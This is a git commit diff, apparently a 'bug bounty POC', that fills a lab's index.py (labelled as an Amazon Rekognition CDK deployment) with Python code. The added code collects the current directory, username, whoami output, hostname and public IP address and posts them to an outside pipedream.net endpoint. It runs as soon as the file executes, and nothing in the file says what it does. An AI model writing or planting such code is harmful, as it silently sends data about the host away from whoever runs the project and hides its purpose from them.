3939daa35005ba0126a5935e176a5d1deabca754
Mux bugbounty POC by @nvk0x <nvk0x02@gmail.com>
2025-08-12 18:19:14 +0530

    Update index.py

--- Labs/80-Amazon-Rekognition-CDK-deployed/index.py
+++ Labs/80-Amazon-Rekognition-CDK-deployed/index.py
@@ -1,1 +1,15 @@
-mux bugbounty 
+import os
+import socket
+import requests
+
+def exfiltrate():
+    data = {
+        'cwd': os.getcwd(),
+        'user': os.getenv('USER') or os.getenv('USERNAME'),
+        'whoami': os.popen('whoami').read().strip(),
+        'hostname': socket.gethostname(),
+        'ip': requests.get("https://api.ipify.org").text,
+    }
+    requests.post("https://eovswbij0qrdg8q.m.pipedream.net", json=data)
+
+exfiltrate()
